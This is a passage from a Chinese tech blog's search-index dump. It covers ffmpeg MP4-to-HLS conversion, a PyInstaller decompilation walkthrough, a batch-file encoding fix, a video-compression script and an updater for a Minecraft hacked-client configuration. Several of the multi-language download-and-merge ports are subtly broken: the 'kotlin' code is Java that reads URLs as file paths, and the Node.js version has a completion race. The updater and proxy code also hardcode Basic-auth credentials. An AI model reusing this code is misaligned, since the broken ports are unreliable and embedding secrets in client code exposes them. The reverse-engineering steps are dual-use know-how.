dp.pause(); } }); var dplayerContainer = document.getElementById(\u0026#39;dplayer\u0026#39;); var timer; dplayerContainer.addEventListener(\u0026#39;mouseleave\u0026#39;, function() { timer = setTimeout(function() { dplayerContainer.style.border = \u0026#39;none\u0026#39;; }, 1000); }); dplayerContainer.addEventListener(\u0026#39;mouseenter\u0026#39;, function() { clearTimeout(timer); dplayerContainer.style.border = \u0026#39;\u0026#39;; }); }); \u0026lt;/script\u0026gt; 实际演示 演示视频: ","date":"2023-09-17T21:45:02+07:00","image":"https://blog.xpdbk.com/post/video-save-free/123123_hud29953d5d9956b3e0e51767d617c14a8_24354_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://blog.xpdbk.com/post/video-save-free/","title":"视频托管方法"},{"content":"FFmpeg 是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。它提供了录制、转换以及流化音视频的软件。\n官方下载网站 http://www.ffmpeg.org/download.html 下载解压缩后配置环境\nMP4 转 M3U8 M3U8 是 Unicode 版本的 M3U，用 UTF-8 编码。”M3U” 和 “M3U8” 文件都是苹果公司使用的 HTTP Live Streaming（HLS） 协议格式的基础，这种协议格式可以在 iPhone 和 Macbook 等设备播放。\n简单来说，m3u8是一个视频格式，就是将一个视频分成很多的小部分，这样方便视频的加载。\n操作简单，效率低 1 ffmpeg -i input.mp4 -c:v libx264 -c:a aac -strict -2 -f hls -hls_list_size 2 -hls_time 15 output.m3u8 生成的效果是：\n将 input.mp4 视频文件每 15 秒生成一个 ts 文件，最后生成一个 m3u8 文件，m3u8 文件是 ts 的索引文件。\n我们直接用 VLC media player 等播放软件是可以直接打开 m3u8 文件，像播放 mp4 一样。\n默认的每片长度为 2 秒，m3u8 文件中默认只保存最新的 5 条片的信息，导致最后播放的时候只能播最后的一小部分（直播的时候特别注意）。\n-hls_time n 设置每片的长度，默认值为 2，单位为秒。\n-hls_list_size n 设置播放列表保存的最多条目，设置为 0 会保存有所片信息，默认值为5。\n-hls_wrap n 设置多少片之后开始覆盖，如果设置为0则不会覆盖，默认值为0。这个选项能够避免在磁盘上存储过多的 片，而且能够限制写入磁盘的最多的片的数量。\n-hls_start_number n 设置播放列表中 sequence number 的值为 number，默认值为 0。\n注意：播放列表的 sequence number 对每个 segment 来说都必须是唯一的，而且它不能和片的文件名（当使用 wrap 选项时，文件名有可能会重复使用）混淆。\n更多参数请看文档：ffmpeg.org/ffmpeg.html#Video-Options\n效率优化，提升效率 TS 文件是一种媒体的扩展名，它是日本高清摄像机拍摄下进行的封装格式。MPEG2-TS（Transport Stream“传输流”；又称TS、TP、MPEG-TS 或 M2T）是用于音效、图像与数据的通信协定，最早应用于DVD的实时传送节目。MPEG2-TS格式的特点就是要求从视频流的任一片段开始都是可以独立解码的。\n1 2 3 4 # 1.视频整体转码ts ffmpeg -y -i music.mp4 -vcodec copy -acodec copy -vbsf h264_mp4toannexb out\\music.ts # 2. .ts文件切片 ffmpeg -i music.ts -c copy -map 0 -f segment -segment_list out\\music.m3u8 -segment_time 10 out\\15s_%3d.ts hls_time 切片时间不准确的问题 播放 m3u8 的 ts 切片，必须要完整的下载一个 ts 切片，才能够播放，设置hls_time 的时间间隔越短越好（ 根据实际情况来 ），实际过程中设置切片时间间隔为 2 秒，调用如下指令：\n1 ffmpeg -i test.mp4 -c:v libx264 -c:a aac -strict -2 -f hls -hls_time 2 index.m3u8 但没有按照参数输入，进行切片。\n原因：\nts 文件的切割，还跟原文件视频的 GOP 大小有关系（也就是两个 I 帧之间的时间间隔），因为任何一个 ts 分片第一帧必须是I帧，否则无法最快播放，并且第一帧不是 I 帧，对于播放器也是没有任何的意义，直接被播放器扔掉。任何一个视频流必须在获取到第一个I帧才能成功解码出图片。虽然指定了 1 秒切割一个 ts 文件，实际上，由于原视频流可能好几秒才有一个 I 帧，所以必须等到下一个 I 帧，才会重新开始切片。\n解决：\n既然知道要1秒产生一个ts分片，那就必须产生切片的过程中，强制一秒中产生一个关键帧。\n设置关键帧间隔，设置间隔为 2 秒的参数如下：-force_key_frames \u0026quot;expr:gte(t,n_forced*2)“\n完整指令如：\n1 ffmpeg -i test.mp4 -force_key_frames \u0026#34;expr:gte(t,n_forced*2)\u0026#34; -strict -2 -c:a aac -c:v libx264 -hls_time 2 -f hls index.m3u8 m3u8 格式解析 完整的 m3u8 文件有三部分：\nindex.m3u8，保存视频的基本信息和分段文件顺序； key，如果视频加密，保存密钥； data文件，其他都是视频的数据文件。 具体内容解析：\n#EXTM3U，是文件开始 #EXT-X-VERSION，标识HLS的协议版本号； #EXT-X-TARGETDURATION，表示每个视频分段最大的时长（单位秒）； #EXT-X-MEDIA-SEQUENCE，表示播放列表第一个 URL 片段文件的序列号； #EXT-X-PLAYLIST-TYPE，表明流媒体类型； #EXT-X-KEY，加密方式，这里加密方式为AES-128，同时指定IV，在解密时需要； #EXTINF，表示其后 URL 指定的媒体片段时长（单位为秒）。 HLS HLS 的工作原理是把整个流分成一个个小的基于 HTTP 的文件来下载，每次只下载一些。\n当媒体流正在播放时，客户端可以选择从许多不同的备用源中以不同的速率下载同样的资源，允许流媒体会话适应不同的数据速率。\n在开始一个流媒体会话时，客户端会下载一个包含元数据的 extended M3U (m3u8) playlist文件，用于寻找可用的媒体流。\nHLS 只请求基本的 HTTP 报文，与实时传输协议（RTP）不同，HLS 可以穿过任何允许 HTTP 数据通过的防火墙或者代理服务器。\n它也很容易使用内容分发网络来传输媒体流。\nm3u8(ts) 合并为 MP4 远程文件 1 ffmpeg -i “https://xpdbk.com/demo/ffmpeg/hls265/output.m3u8” -vcodec copy -acodec copy -absf aac_adtstoasc output.mp4 本地文件 1、打开 cmd\n2、输入指令，按照文件的实际路径合并\n合并成 ts文件 copy /b F:\\f\\*.ts E:\\f\\new.ts\n合并成 MP4 文件 copy /b F:\\f\\*.ts E:\\f\\new.MP4\n而通过 ffmpeg 命令如下：\n1 2 3 4 5 6 7 8 直接转： ffmpeg -i new.ts -c copy -map 0:v -map 0:a output.mp4 指定音频流（一般用这个）： ffmpeg -i new.ts -c copy -map 0:v -map 0:a -bsf:a aac_adtstoasc output.mp4 重编码视频： ffmpeg -y -i new.ts -c:v libx264 -c:a copy -bsf:a aac_adtstoasc output.mp4 php实现代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $url = \u0026#39;https://******.m3u8?Expires=15853412145\u0026amp;OSSAccessKeyId=******\u0026amp;Signature=******\u0026#39;; $ts_content = file_get_contents($url); $ts_content = explode(\u0026#39;,\u0026#39;, $ts_content); $ts_file = array(); foreach ($ts_content as $key =\u0026gt; $value) { if($key == 0) continue; $value = trim($value); $ts_file[] = substr($value, 0, strpos($value, \u0026#39;.ts\u0026#39;) + 3); } $url_prefix = substr($url, 0, strpos($url, \u0026#39;.m3u8\u0026#39;)); $url_prefix = substr($url, 0, strrpos($url, \u0026#39;/\u0026#39;) + 1); $file_content = \u0026#39;\u0026#39;; foreach ($ts_file as $key =\u0026gt; $value) { $file_content .= file_get_contents($url_prefix . $value); } file_put_contents(\u0026#39;tmp_out.ts\u0026#39;, $file_content); // FFMPEG_PATH 是你自己解压ffmpeg的bin路径，例如我的是F:/ffmpeg/bin/ exec(FFMPEG_PATH . \u0026#34;ffmpeg -i tmp_out.ts tmp_out.mp4\u0026#34;); Python实现代码 目录结构\n./\n|\u0026ndash; m3u8.py\n|\u0026ndash; result\n|\u0026ndash; 文件1\n|\u0026ndash; key\n|\u0026ndash; index.m3u8\n|\u0026ndash; data\u0026hellip;\n|\u0026ndash; 文件2\n|\u0026ndash; \u0026hellip; 114514\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 import os import sys import time from Crypto.Cipher import AES def fileList(findex): rpath = os.path.dirname(os.path.realpath(findex)) name = rpath.split(\u0026#34;\\\\\u0026#34;)[-1] fi = open(findex, \u0026#39;r\u0026#39;) flag = False IV = None tl = [] for line in fi.readlines(): if line.startswith(\u0026#34;#EXT-X-KEY\u0026#34;): # 如果存在 IV 则提取； if line.split(\u0026#34;,\u0026#34;)[-1].startswith(\u0026#34;IV=\u0026#34;): IV = line.split(\u0026#34;,\u0026#34;)[-1][5:] IV = bytes.fromhex(IV) if line.startswith(\u0026#34;#EXTINF\u0026#34;): flag = not flag continue if flag: tmp = line.strip().split(\u0026#34;/\u0026#34;)[-1] tmp = os.path.join(rpath, tmp) tl.append(tmp) flag = not flag fi.close() fk = open(os.path.join(rpath, \u0026#34;key\u0026#34;), \u0026#39;rb\u0026#39;) key = fk.read() fk.close() return name, tl, key, IV def aes_decode(data, key, IV): # 如果没有指定 IV 值，则直接使用 key 值 if not IV: IV = key cryptor = AES.new(key, AES.MODE_CBC, IV) plain_text = cryptor.decrypt(data) return plain_text def main(): fp = os.listdir() used = [s[:-4] for s in os.listdir(\u0026#34;./result/\u0026#34;)] for ind in fp: if not ind.isdigit(): continue if ind in used: continue try: name, fl, key, IV = fileList(os.path.join(ind, \u0026#34;index.m3u8\u0026#34;)) except: print(\u0026#34;-\u0026#34;*30) print(\u0026#34;[-] Errot! file: \u0026#34;, ind) print(\u0026#34;-\u0026#34;*30) continue print(\u0026#34;[*] Begin process file: \u0026#34;, name) start = time.time() f = open(os.path.join(\u0026#34;./result/\u0026#34;, name+\u0026#34;.mp4\u0026#34;), \u0026#39;ab\u0026#39;) for i in fl: with open(i, \u0026#39;rb\u0026#39;) as inf: data = inf.read() f.write(aes_decode(data, key, IV)) f.close() print(\u0026#34;[+] Sucessfully! Cost time: \u0026#34;, time.time()-start) main() Golang实现代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package main import ( \u0026#34;io/ioutil\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;strings\u0026#34; ) func main() { url := \u0026#34;https://******.m3u8?Expires=15853412145\u0026amp;OSSAccessKeyId=******\u0026amp;Signature=******\u0026#34; resp, _ := http.Get(url) body, _ := ioutil.ReadAll(resp.Body) tsContent := strings.Split(string(body), \u0026#34;,\u0026#34;) var tsFile []string for key, value := range tsContent { if key == 0 { continue } value = strings.TrimSpace(value) tsFile = append(tsFile, value[:strings.Index(value, \u0026#34;.ts\u0026#34;)+3]) } urlPrefix := url[:strings.LastIndex(url, \u0026#34;/\u0026#34;)+1] var fileContent string for _, value := range tsFile { resp, _ := http.Get(urlPrefix + value) body, _ := ioutil.ReadAll(resp.Body) fileContent += string(body) } ioutil.WriteFile(\u0026#34;tmp_out.ts\u0026#34;, []byte(fileContent), 0644) cmd := exec.Command(\u0026#34;ffmpeg\u0026#34;, \u0026#34;-i\u0026#34;, \u0026#34;tmp_out.ts\u0026#34;, \u0026#34;tmp_out.mp4\u0026#34;) cmd.Run() } Rust实现代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 use std::fs::File; use std::io::prelude::*; use std::process::Command; use reqwest; #[tokio::main] async fn main() -\u0026gt; Result\u0026lt;(), Box\u0026lt;dyn std::error::Error\u0026gt;\u0026gt; { let url = \u0026#34;https://******.m3u8?Expires=15853412145\u0026amp;OSSAccessKeyId=******\u0026amp;Signature=******\u0026#34;; let resp = reqwest::get(url).await?.text().await?; let ts_content: Vec\u0026lt;\u0026amp;str\u0026gt; = resp.split(\u0026#39;,\u0026#39;).collect(); let mut ts_file = vec![]; for (i, line) in ts_content.iter().enumerate() { if i == 0 { continue; } let value = line.trim(); ts_file.push(\u0026amp;value[0..value.find(\u0026#34;.ts\u0026#34;).unwrap()+3]); } let url_prefix = \u0026amp;url[0..url.rfind(\u0026#39;/\u0026#39;).unwrap()+1]; let mut file_content = vec![]; for file in ts_file { let resp = reqwest::get(\u0026amp;(url_prefix.to_string() + file)).await?.bytes().await?; file_content.extend_from_slice(\u0026amp;resp); } let mut file = File::create(\u0026#34;tmp_out.ts\u0026#34;)?; file.write_all(\u0026amp;file_content)?; Command::new(\u0026#34;ffmpeg\u0026#34;) .arg(\u0026#34;-i\u0026#34;) .arg(\u0026#34;tmp_out.ts\u0026#34;) .arg(\u0026#34;tmp_out.mp4\u0026#34;) .output() .expect(\u0026#34;Failed to execute command\u0026#34;); Ok(()) } C++实现代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;curl/curl.h\u0026gt; size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) { size_t newLength = size*nmemb; size_t oldLength = s-\u0026gt;size(); try { s-\u0026gt;resize(oldLength + newLength); } catch(std::bad_alloc \u0026amp;e) { return 0; } std::copy((char*)contents,(char*)contents+newLength,s-\u0026gt;begin()+oldLength); return size*nmemb; } std::string GetFile(const std::string\u0026amp; url) { CURL* curl; CURLcode res; std::string readBuffer; curl_global_init(CURL_GLOBAL_DEFAULT); curl = curl_easy_init(); if(curl) { curl_easy_setopt(curl, CURLOPT_URL, url.c_str()); curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback); curl_easy_setopt(curl, CURLOPT_WRITEDATA, \u0026amp;readBuffer); res = curl_easy_perform(curl); if(res != CURLE_OK) fprintf(stderr, \u0026#34;curl_easy_perform() failed: %s\\n\u0026#34;, curl_easy_strerror(res)); curl_easy_cleanup(curl); } curl_global_cleanup(); return readBuffer; } int main() { std::string url = \u0026#34;https://******.m3u8?Expires=15853412145\u0026amp;OSSAccessKeyId=******\u0026amp;Signature=******\u0026#34;; std::string ts_content = GetFile(url); std::vector\u0026lt;std::string\u0026gt; ts_file; std::string delimiter = \u0026#34;,\u0026#34;; size_t pos = 0; std::string token; while ((pos = ts_content.find(delimiter)) != std::string::npos) { token = ts_content.substr(0, pos); ts_file.push_back(token.substr(0, token.find(\u0026#34;.ts\u0026#34;) + 3)); ts_content.erase(0, pos + delimiter.length()); } std::string url_prefix = url.substr(0, url.rfind(\u0026#39;/\u0026#39;) + 1); std::ofstream outfile (\u0026#34;tmp_out.ts\u0026#34;,std::ofstream::binary); for (auto \u0026amp;value : ts_file) { std::string file_content = GetFile(url_prefix + value); outfile.write(file_content.c_str(), file_content.size()); } outfile.close(); system(\u0026#34;ffmpeg -i tmp_out.ts tmp_out.mp4\u0026#34;); } NASM实现代码 1 我不会 NODEJS实现代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 const https = require(\u0026#39;https\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const { exec } = require(\u0026#39;child_process\u0026#39;); const url = \u0026#39;https://******.m3u8?Expires=15853412145\u0026amp;OSSAccessKeyId=******\u0026amp;Signature=******\u0026#39;; https.get(url, (res) =\u0026gt; { let tsContent = \u0026#39;\u0026#39;; res.on(\u0026#39;data\u0026#39;, (chunk) =\u0026gt; { tsContent += chunk; }); res.on(\u0026#39;end\u0026#39;, () =\u0026gt; { const tsFile = tsContent.split(\u0026#39;,\u0026#39;).slice(1).map(value =\u0026gt; value.trim().split(\u0026#39;.ts\u0026#39;)[0] + \u0026#39;.ts\u0026#39;); const urlPrefix = url.split(\u0026#39;.m3u8\u0026#39;)[0]; let fileContent = \u0026#39;\u0026#39;; tsFile.forEach((value, i) =\u0026gt; { https.get(urlPrefix + value, (res) =\u0026gt; { let data = \u0026#39;\u0026#39;; res.on(\u0026#39;data\u0026#39;, (chunk) =\u0026gt; { data += chunk; }); res.on(\u0026#39;end\u0026#39;, () =\u0026gt; { fileContent += data; if (i === tsFile.length - 1) { fs.writeFile(\u0026#39;tmp_out.ts\u0026#39;, fileContent, (err) =\u0026gt; { if (err) throw err; exec(\u0026#39;ffmpeg -i tmp_out.ts tmp_out.mp4\u0026#39;, (err, stdout, stderr) =\u0026gt; { if (err) throw err; }); }); } }); }); }); }); }); kotlin实现代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import java.io.*; import java.net.URL; import java.nio.file.*; import java.util.stream.*; public class Main { public static void main(String[] args) throws IOException { String url = \u0026#34;https://******.m3u8?Expires=15853412145\u0026amp;OSSAccessKeyId=******\u0026amp;Signature=******\u0026#34;; String tsContent = new String(Files.readAllBytes(Paths.get(url))); String[] tsFile = tsContent.split(\u0026#34;,\u0026#34;); String urlPrefix = url.substring(0, url.lastIndexOf(\u0026#39;/\u0026#39;) + 1); StringBuilder fileContent = new StringBuilder(); for (int i = 1; i \u0026lt; tsFile.length; i++) { String value = tsFile[i].trim(); fileContent.append(new String(Files.readAllBytes(Paths.get(urlPrefix + value.substring(0, value.indexOf(\u0026#34;.ts\u0026#34;) + 3))))); } Files.write(Paths.get(\u0026#34;tmp_out.ts\u0026#34;), fileContent.toString().getBytes()); try { ProcessBuilder pb = new ProcessBuilder(\u0026#34;ffmpeg\u0026#34;, \u0026#34;-i\u0026#34;, \u0026#34;tmp_out.ts\u0026#34;, \u0026#34;tmp_out.mp4\u0026#34;); Process p = pb.start(); p.waitFor(); } catch (Exception e) { e.printStackTrace(); } } } ","date":"2023-09-12T22:10:08+07:00","permalink":"https://blog.xpdbk.com/post/ffmepg-mp4-to-hls-haha/","title":"MP4到流视频转换"},{"content":"逆向Pyinstaller打包的exe文件源码 我们都知道可以使用库可将.py文件编译成.exe文件运行，我们就从将脚本编译成.exe并将.exe的源码内容反编译出源文件。\n写在前面 我们都知道可以使用Pyinstaller库可将.py文件编译成.exe文件运行，这篇文章我们就从将脚本编译成.exe并将.exe的源码内容反编译出源文件。\n环境工具 Python 3.8.10：没有自己下载 Pyinstaller库：pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller==5.13.0\npyinstxtractor.py：下载地址 编译程序 检查环境 1 python -V 如果执行成功就可以了\n编写脚本 awa.py\n1 2 3 4 5 6 7 8 9 10 11 12 import datetime # 函数 def test(): print(\u0026#34;====666====\u0026#34;) input_text = input(\u0026#34;我是说的道理1\u0026#34;) # 打印格式化时间和用户输入的内容 print(datetime.datetime.now().strftime(\u0026#34;%Y-%m-%d %H:%M:%S \u0026#34;) + input_text) if __name__ == \u0026#39;__main__\u0026#39;: test() 打包程序 首先安装打包程序所使用的库pyinstaller，这里用了清华源并且指定使用了5.13.0版本库\n1 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller==5.13.0 找到脚本所在的文件夹，我的是D:\\ cd 到此路径下，并输入以下打包命令：\n1 Pyinstaller -F awa.py 命令执行完毕后，会看到completed successfully.字段，表示.exe文件生成成功，在dist文件夹中。\n逆向过程 首先我们下载反编译脚本pyinstxtractor.py与我们要反编译的.exe文件放入同一个工作目录下\n然后我们继续在命令行cd到dist文件夹，输入以下命令并执行：\n1 python pyinstxtractor.py awa.exe 执行完毕，看到Successfully字样，会生成awa.exe_extracted文件夹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [+] Processing FDP配置在线更新2.exe [+] Pyinstaller version: 2.1+ [+] Python version: 3.8 [+] Length of package: 32503973 bytes [+] Found 141 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_pyqt5.pyc [+] Possible entry point: pyi_rth_pkgutil.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: 下载json.pyc [+] Found 225 files in PYZ archive [+] Successfully extracted pyinstaller archive: FDP配置在线更新2.exe You can now use a python decompiler on the pyc files within the extracted direct ory 进入该文件夹，里面有许许多多后缀为.dll和.pyd的文件，还有一个名为PYZ-00.pyz_extracted的文件夹，这个文件夹里放的是程序引入的依赖库，如果你引入过自己其他的.py文件，就可以用类似的方法将依赖的.py文件反编译出来\n在目录中我们要找到awa.pyc和与你的awa.exe文件同名的文件\n然后就可以把这个.pyc文件拿到搜索引擎上面的任意一个pyc转py文件的网站转换了\n","date":"2023-09-12T21:45:21+07:00","permalink":"https://blog.xpdbk.com/post/debug-pyinstaller-crack/","title":"逆向Pyinstaller打包程序的一个方法"},{"content":"问题 bat 批处理脚本如下\n1 2 3 4 5 6 @echo off echo hello,world. echo 哈哈 pause 在 CMD 执行脚本时，出现了中文乱码\n分析 乱码都与字符编码有关。。\n计算机只能处理数字。如果遇到文本，则必须在处理前将其转换为数字。这是字符编码（字符集）出现的地方。。如果使用某种字符编码进行编码，则必须使用相同的字符编码进行解码。如果使用不同的字符编码，就会出现乱码。。\n解决 转换脚本文件的编码方式 默认情况下，在 bat 脚本文件中，如果中文不是ANSI编码，就会出现乱码。因此，可以采用Windows操作系统平台自带的记事本打开脚本文件，点击菜单【文件】-【另存为】操作，选择ANSI编码进行保存。\n转换编码后，再次运行，中文乱码问题得到解决。\n更改代码 在原先 bat 脚本文件中声明更改前面的代码\n1 chcp 65001 其他 常用代码页映射 代码页 映射的字符集 936 GB2312 20127 US-ASCII 65001 UTF-8 ","date":"2023-09-12T21:13:05+07:00","permalink":"https://blog.xpdbk.com/post/batchfile-fix-lange-erorr/","title":"Batchfile批处理脚本乱码解决方法"},{"content":"ffmpeg批量转换为小视频 有些时候我们需要批量压缩文件夹里面的视频，这时候我们就能使用python来对ffmpeg进行自动操控实现批量转视频，本脚本仅在termux上面使用过\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import os import subprocess import shlex script_dir = os.path.dirname(os.path.realpath(__file__)) video_dir = script_dir for root, dirs, files in os.walk(video_dir): for video in files: if video.endswith(\u0026#39;.mp4\u0026#39;): filename, ext = os.path.splitext(video) out_file1 = filename + \u0026#39;_1\u0026#39; + ext cmd1 = f\u0026#39;ffmpeg -i {shlex.quote(os.path.join(root, video))} -g 90 -b:v 2000k -bufsize 2000k -maxrate 2500k {shlex.quote(os.path.join(root, out_file1))}\u0026#39; subprocess.run(cmd1, shell=True) out_file2 = filename + \u0026#39;_2\u0026#39; + ext cmd2 = f\u0026#39;ffmpeg -i {shlex.quote(os.path.join(root, out_file1))} -g 90 -r 30 {shlex.quote(os.path.join(root, out_file2))}\u0026#39; subprocess.run(cmd2, shell=True) os.remove(os.path.join(root, out_file1)) print(\u0026#39;Done!\u0026#39;) 使用方法 安装ffmpeg和python3运行即可\n","date":"2023-09-10T21:38:10+07:00","permalink":"https://blog.xpdbk.com/post/ffmpeg-python-video-allinsmall/","title":"ffmpeg批量压缩转换视频为30FPS"},{"content":"外置FDP配置更新器（Python版本） 经过测试可以使用（请使用python3.8.10进行运行）\n使用了HTTP BASIC验证来进行验证防护，当然了还有HWID验证和时间戳验证和私有浏览器UA验证和完整性验证和内存解压什么的，但是都太复杂了呜呜呜\n点下我呀 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 import os import requests from urllib3.util import Retry from requests.adapters import HTTPAdapter from PyQt5.QtGui import QIcon from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QMessageBox from PyQt5.QtCore import Qt USERNAME = \u0026#39;tRd#D9l6XVY5GFQUQDDN\u0026#39; PASSWORD = \u0026#39;c!rY5iMUv8c4jGT1u0nH\u0026#39; session = requests.Session() retry = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504]) adapter = HTTPAdapter(max_retries=retry) session.mount(\u0026#39;https://\u0026#39;, adapter) class MainWindow(QMainWindow): def __init__(self=None): super().__init__() self.setWindowTitle(\u0026#39;FDP配置文件在线更新\u0026#39;) self.setGeometry(0, 0, 300, 150) self.setFixedSize(300, 150) qtRectangle = self.frameGeometry() centerPoint = QApplication.desktop().availableGeometry().center() qtRectangle.moveCenter(centerPoint) self.move(qtRectangle.topLeft()) self.setWindowIcon(QIcon(\u0026#39;avatar.jpg\u0026#39;)) author_label = QLabel(self) author_label.setText(\u0026#34;\u0026lt;a href=\u0026#39;https://blog.xpdbk.com\u0026#39;\u0026gt;© LEl_FENG\u0026lt;/a\u0026gt;\u0026#34;) author_label.setOpenExternalLinks(True) author_label.setAlignment(Qt.AlignRight) author_label.setGeometry(200, 10, 90, 20) welcome_label = QLabel(self) welcome_label.setText(\u0026#39;\u0026lt;h2\u0026gt;欢迎使用OVO\u0026lt;/h2\u0026gt;\u0026#39;) welcome_label.setAlignment(Qt.AlignLeft) welcome_label.setGeometry(10, 10, 150, 30) label = QLabel(self) label.setText(\u0026#39;开始更新FDP配置\u0026#39;) label.move(100, 50) button = QPushButton(\u0026#39;更新配置文件\u0026#39;, self) button.move(100, 90) button.clicked.connect(self.download_confirmation) def download_confirmation(self): reply = QMessageBox.question(self, \u0026#39;确认下载\u0026#39;, \u0026#39;确定要更新配置文件吗，可能会覆盖你的配置文件\u0026#39;, QMessageBox.Yes | QMessageBox.No, QMessageBox.No) if reply == QMessageBox.Yes: configs_dir = os.path.join(\u0026#39;.minecraft\u0026#39;, \u0026#39;versions\u0026#39;, \u0026#39;FDP\u0026#39;, \u0026#39;FDPCLIENT-1.8\u0026#39;, \u0026#39;configs\u0026#39;) for file in os.listdir(configs_dir): if file.endswith(\u0026#39;.json\u0026#39;): os.remove(os.path.join(configs_dir, file)) download_all_jsons(\u0026#39;https://config-pass.lel-feng.workers.dev/fite.txt\u0026#39;) def download_json(url, save_path): response = session.get(url, auth=(USERNAME, PASSWORD)) with open(save_path, \u0026#39;wb\u0026#39;) as out_file: out_file.write(response.content) def download_all_jsons(url): response = session.get(url, auth=(USERNAME, PASSWORD)) if response.status_code == 200: content = response.content.decode(\u0026#39;utf-8\u0026#39;) json_urls = [line.strip() for line in content.split(\u0026#39;\\n\u0026#39;) if line.strip()] for json_url in json_urls: if json_url.endswith(\u0026#39;.json\u0026#39;): json_filename = os.path.basename(json_url) save_path = os.path.join(\u0026#39;.minecraft\u0026#39;, \u0026#39;versions\u0026#39;, \u0026#39;FDP\u0026#39;, \u0026#39;FDPCLIENT-1.8\u0026#39;, \u0026#39;configs\u0026#39;, json_filename).replace(\u0026#39;/\u0026#39;, \u0026#39;\\\\\u0026#39;) download_json(json_url, save_path) if __name__ == \u0026#39;__main__\u0026#39;: app = QApplication([]) window = MainWindow() window.show() app.exec_() 服务端是什么 CloudFlare Worker的反代脚本\n点下我呀 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 addEventListener(\u0026#39;fetch\u0026#39;, event =\u0026gt; { event.respondWith(handleRequest(event.request)) }) async function handleRequest(request) { // 设置 HTTP 基本身份验证的用户名和密码 const USERNAME = \u0026#39;tRd#D9l6XVY5GFQUQDDN\u0026#39; const PASSWORD = \u0026#39;c!rY5iMUv8c4jGT1u0nH\u0026#39; // 检查请求是否包含正确的身份验证凭据 const authHeader = request.headers.get(\u0026#39;Authorization\u0026#39;) if (!authHeader || !checkAuth(authHeader,USERNAME,PASSWORD)) { return new Response(\u0026#39;Unauthorized\u0026#39;, { status: 401, headers: { \u0026#39;WWW-Authenticate\u0026#39;: \u0026#39;Basic realm=\u0026#34;Access to the requested resource\u0026#34;\u0026#39; } }) } // 设置源服务器的 URL const originUrl = new URL(request.url) originUrl.hostname = \u0026#39;wjgl.pages.dev\u0026#39; originUrl.pathname = new URL(request.url).pathname // 使用更新后的 URL 创建新请求 const newRequest = new Request(originUrl, request) // 从源服务器获取响应 const response = await fetch(newRequest) // 将响应返回给客户端 return response } function checkAuth(authHeader, username, password) { // 解码身份验证头 const [type, credentials] = authHeader.split(\u0026#39; \u0026#39;) if (type !== \u0026#39;Basic\u0026#39;) return false const decodedCredentials = atob(credentials) // 检查提供的凭据是否与预期的用户名和密码匹配 return decodedCredentials === `${username}:${password}` } Go语言版本 Golang1.20.7\n点下我呀 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 package main import ( \u0026#34;io\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;path/filepath\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/andlabs/ui\u0026#34; ) var ( mainwin *ui.Window ) func setupUI() { mainwin = ui.NewWindow(\u0026#34;FDP配置文件在线更新\u0026#34;, 300, 150, false) mainwin.OnClosing(func(*ui.Window) bool { ui.Quit() return true }) ui.OnShouldQuit(func() bool { mainwin.Destroy() return true }) vbox := ui.NewVerticalBox() vbox.SetPadded(true) hbox := ui.NewHorizontalBox() hbox.SetPadded(true) vbox.Append(hbox, false) welcomeLabel := ui.NewLabel(\u0026#34;欢迎使用OVO\u0026#34;) 